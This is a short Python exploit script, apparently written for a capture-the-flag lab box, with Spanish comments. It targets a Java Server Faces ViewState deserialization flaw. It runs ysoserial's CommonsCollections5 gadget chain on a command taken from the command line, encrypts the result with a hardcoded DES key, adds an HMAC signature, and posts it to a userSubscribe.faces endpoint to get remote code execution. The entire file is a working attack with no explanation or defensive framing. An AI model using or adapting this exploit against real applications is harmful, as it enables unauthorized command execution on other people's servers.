#!/usr/bin/python

import base64, sys, hashlib, requests, subprocess
import hmac
from Crypto.Cipher import DES

# Input 
cmd = sys.argv[1]

def fixlen(data):
	n = 8 - len(data) % 8
	data = data + chr(n) * n
	return data

def decrypt():
	# Convertir en Text el Base64
	view_state = base64.b64decode("wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg=")

	# Convertir en Texto la Clave 
	secret = base64.b64decode("SnNGOTg3Ni0=")

	# Cipher para descriptar con la clave usando el metodo de encriptaci'on DES y el modulo ECB
	cipher = DES.new(secret, DES.MODE_ECB)

	# Imprimimos el resultado desencriptado
	print cipher.decrypt(fixlen(view_state))

def encrypt(cmd):
	yoserial = 'java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 "' + cmd  + '"'
	payload = subprocess.check_output(yoserial, shell=True)

	payload = fixlen(payload)

	secret = base64.b64decode("SnNGOTg3Ni0=")
	cipher = DES.new(secret, DES.MODE_ECB)

	payload = cipher.encrypt(payload)

	hmac2 = hmac.new(secret, payload, hashlib.sha1).digest()

	payload = base64.b64encode(payload + hmac2)

	return payload

proxies = {
	'http' : 'http://127.0.0.1:8080'
}

url = "http://10.10.10.130:8080/userSubscribe.faces"
r = requests.get(url)

data = { "javax.faces.ViewState" : encrypt(cmd) }

r = requests.post(url, data=data, proxies=proxies)
